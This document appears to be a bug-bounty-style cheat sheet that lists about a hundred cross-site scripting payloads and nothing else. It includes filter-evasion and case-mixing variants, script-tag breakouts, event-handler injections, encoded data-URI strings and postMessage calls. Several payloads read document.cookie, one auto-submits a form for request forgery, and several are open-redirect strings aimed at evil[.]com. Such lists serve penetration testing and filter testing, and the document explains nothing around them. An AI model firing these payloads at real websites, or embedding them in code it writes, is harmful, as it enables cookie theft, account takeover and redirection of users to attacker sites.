# XSS-Payloads

Inner XSS

document.getElementsByTag('body')[0].innerHTML = `<img\nsrc="x"onerror=alert(1)>`

<img src=x onerror=alert(1)>

<img/src=x onerror=alert(1)>

<img/src="x"/onerror=alert(1)>

<img/src="x"onerror=alert(1)>

<img\nsrc="x"onerror=alert(1)>

<img src="x">

target[.]com/?redirect_to=evil[.]com

JavaScript XSS

");alert('xss');

')alert('xss');

javas%09cript:alert(1)

<a href="javascript:alert(1)">asd123</a>

" onmo<x>useover="alert(document['cookie'])">

" onf<x>ocus="alert(document['cookie'])" autofocus">

<img src="x" onclick="prompt(1)">

<img src=x oncjavascipt:lick=prompt(1)>

<a href="http://"onmouseover="alert(1);">

';alert(1);'

<script>var token='';alert(1);''</script>

</script><script>alert(1);</script>

<script>var token=</script><script>alert(1);</script>';</script>

><script>alert(1);</script>

"><h1>test</h1>

'+alert(1)+'

"onmouseover="alert(1)

http://"onmouseover="alert(1)

%09onmousover=alert(1)

%3f%09onmousover=alert(1)

%3f%09onmousover=alert(document.location.hash.substring(1))#{XSS} ---> Console ---> document.location.hash

asd";}catch(e){}alert(document.cookie);try{XSS="

lookhere’);});</script><img src=x onerror=alert(‘XSS’)>

Target[.]com/?s=”><script>alert(1)</script>&s=”><script>alert(1)</script>

'"> <svg/onload=prompt(1);>{{1*1}}

/?utm_source=%60%2balert/**/(1)%2b%60

/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e<a href="javascript:alert(1)'>XSS</a>

1"-top["con\x66irm"](document.domain)-"

javascript: //% 250Alert (document.location = document.cookie)

'-prompt.call(window, 'xss')-'

'-alert.call(window, 'xss')-'

<\/script><script>alert('XSS')<\/script>

aaa"bbb'ccc<svg onload=alert('XSS')>eee

<svg onload="alert('XSS on '+ document.domain)">

</title></script/"-alert( 0)-"--><img/onerror='; alert(/XSS/);'src=1>

</title></script/"-alert(0)-"-->"><svg/ onload=prompt(/XSS/)>

<script>alert(1);//

"'> </form><script>alert("XSS");</script>

'> </form><script>alert("XSS");</script>

javascript://%0a%0dalert(document.cookie)

*/alert('XSS\n-XSS'); //

''> </form><script>alert("XSS");</script>

'"><ScRiPt >prompt(/XSS/)</ScRiPt>

'"> <ScRiPt >prompt(/XSS/)</ScRiPt>

data:,\u0077indow.top.alert(1)

"><svg onload="alert(domain)

"-alert(document.domain)-"

</script/x><scr<script>ipt>alert(1)</script/x>

onmouseover=alert'(document.domain)'

/<marquee loop=1 width=0 onfinish=alert(1)>

</TITLE><sCRipT>alert ("XSS");</sCRipT><TITLE>

<svg>/OnLoad="`${prompt"}`">

<--`<img/src=`%20onerror=confirm``>%20--!>

<svg </onload ="1> (_=alert,_(1337)) "">

<img onerror=alert(1) src <u></u>

';redirecturl='javascript:alert("XSS")

';redirecturl='http://google.com/'

redirect_to=////evil%E3%80%82com

"/>alert("Xss:Priyanshu")

"/></script><script>alert(/XSS/)</script>

<body onload=alert(1)>

"<body onload="alert('XSS')">

"><%2Fstyle<%2Fscript><script>confirm("XSS")<%2Fscript>

<body onload=document.getElementById("xsrf").submit()>

<a href="data:text/html;based64_,<svg/onload=\u0061&#x6c;&101%72t(1)>">X</a

<a href="data:text/html;based64_,<svg/onload=\u0061&#x6c;&101%72t(document.cookie)>">X</a

http://test.com<script>alert(document.domain)</script>

http://test.com<script>alert(document.cookie)</script>

<img src=x onerror=alert(document.domain)>

x"></script><img src=x onerror=alert(1)>

q=" onclick="alert(/XSS/)

"><iframe src='javascript:prompt(/XSS/);'>

<iframe src="https://google.com"></iframe>

"><iframe src=a onload=alert('XSS')<

</script><script>alert(document.cookie)</script>

<xss>alert('xss')</xss>

<iframe src="https://google.com"></iframe>

/default.aspx#"><img src=x onerror=prompt('XSS');>

/default.aspx#"><img src=x onerror=prompt('0');>

<img src=x onerror=prompt(1);> by ">

“><img src=x onerror=prompt(0)>.txt.jpg

“><img src=x onerror=alert(document.cookie)>

"><img src=x onerror=prompt(1);>

"><script>alert('XSS')</script>

id=abc"><Script>alert(/xss/)</SCRIPT>

"><img src=" " onMouseover=prompt(/xss/);>

Default.aspx/" onmouseout="confirm(1)'x="

Console 

window.postMessage('alert(document.domain','*')

window.postMessage({"action": "exec", "payload": "alert(document.domain)"}, '*')
